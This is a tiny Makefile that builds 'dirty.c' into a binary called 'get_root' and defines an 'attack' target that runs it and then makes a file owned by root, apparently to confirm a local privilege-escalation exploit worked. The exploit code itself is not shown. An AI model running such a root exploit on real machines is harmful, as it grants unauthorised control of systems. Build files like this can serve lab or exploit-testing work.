all: dirty.c
	gcc -std=c99 -lpthread dirty.c -o get_root

attack:
	./get_root
	touch success
	chown root success
	chgrp root success

clean:
	rm success get_root
